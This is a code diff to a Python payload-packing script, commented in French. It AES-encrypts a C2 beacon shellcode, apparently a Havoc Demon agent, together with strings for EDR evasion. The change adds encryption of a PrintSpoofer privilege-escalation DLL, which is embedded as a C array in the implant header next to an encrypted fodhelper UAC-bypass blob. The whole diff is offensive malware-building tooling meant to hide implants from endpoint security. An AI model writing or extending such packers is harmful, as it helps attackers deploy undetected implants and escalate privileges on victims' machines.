@@ -67,7 +67,7 @@ def encrypt_string(plaintext_str, cipher_obj):
 def encrypt_with_seed(input_file, output_file, edr_config_file=None):
     if not os.path.exists(input_file):
         print(f"❌ {input_file} introuvable")
-        return False
+        return False, None, None, None
 
     with open(input_file, 'rb') as f:
         plaintext = f.read()
@@ -164,13 +164,56 @@ static const size_t fodhelper_enc_len = {len(fodhelper_enc)};
 
     print("")
     print(f"[+] demon.x64.h généré")
-    return True
+    return True, seed, key, iv
+
+def encrypt_dll(dll_file, seed, key, iv):
+    """Chiffre une DLL avec seed/key/iv existants"""
+    if not os.path.exists(dll_file):
+        print(f"[-] {dll_file} introuvable")
+        return None
+    
+    with open(dll_file, 'rb') as f:
+        plaintext = f.read()
+    
+    print(f"\n[*] Chiffrement DLL: {os.path.basename(dll_file)}")
+    print(f"[+] DLL size: {len(plaintext)} bytes")
+    
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    
+    pad_len = 16 - (len(plaintext) % 16)
+    padded = plaintext + bytes([pad_len] * pad_len)
+    ciphertext = encryptor.update(padded) + encryptor.finalize()
+    
+    final_dll = seed + ciphertext  # ← SEED + cipher (same as payload)
+    
+    print(preview_hex(final_dll, "[+] printspoofer_enc"))
+    
+    return final_dll
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='aes encryption')
     parser.add_argument('-i', '--input', required=True, help='beacon pe/shellcode')
     parser.add_argument('-o', '--output', required=False, help='payload chiffré (optionnel)')
+    parser.add_argument('--dll', required=False, help='printspoofer.dll à chiffrer (optionnel)')
     args = parser.parse_args()
 
-    success = encrypt_with_seed(args.input, args.output, 'edr_strings.conf')
+    success, seed, key, iv = encrypt_with_seed(args.input, args.output, 'edr_strings.conf')
+    
+    # Si DLL fournie, la chiffrer avec le même seed/key/iv
+    if success and args.dll and seed and key and iv:
+        dll_enc = encrypt_dll(args.dll, seed, key, iv)
+        if dll_enc:
+            dll_array = format_c_array(dll_enc)
+            
+            # Append au fichier demon.x64.h
+            dll_declaration = f"\nstatic unsigned char printspoofer_enc[] = {{\n{dll_array}\n}};\n"
+            dll_declaration += f"static const size_t printspoofer_enc_len = {len(dll_enc)};\n"
+            
+            with open("demon.x64.h", 'a') as f:
+                f.write(dll_declaration)
+            
+            print(f"[+] printspoofer_enc ajoutée à demon.x64.h")
+    
     exit(0 if success else 1)
+
